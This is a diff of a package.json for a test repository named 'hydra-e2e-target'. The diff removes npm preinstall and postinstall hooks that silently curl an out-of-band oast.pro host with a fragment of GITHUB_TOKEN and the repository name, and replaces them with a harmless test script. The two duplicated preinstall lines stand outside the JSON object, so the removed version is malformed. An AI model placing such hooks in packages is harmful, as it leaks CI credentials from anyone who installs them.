@@ -1,10 +1,8 @@
-"preinstall": "curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/hydra?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
-"preinstall": "curl -s 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/hydra?t=$(printf '%s' "${GITHUB_TOKEN:0:8}" | base64)&r=${GITHUB_REPOSITORY}' -o /dev/null"
 {
   "name": "hydra-e2e-target",
   "version": "1.0.0",
-  "_comment": "HYDRA_STAGE3_E2E-REAL-PRT-BAS_LIVE",
+  "description": "E2E test repository for HYDRA pipeline",
   "scripts": {
-    "postinstall": "curl -s -o /dev/null 'https://d6ek6173rtnk8sodpo80ww1sgyeekn9ex.oast.pro/stage3?t=${GITHUB_TOKEN:0:6}&r=${GITHUB_REPOSITORY}&s=HYDRA_STAGE3_E2E-REAL-PRT-BAS_LIVE' || true; echo 'HYDRA_STAGE3_E2E-REAL-PRT-BAS_LIVE'"
+    "test": "echo ok"
   }
 }
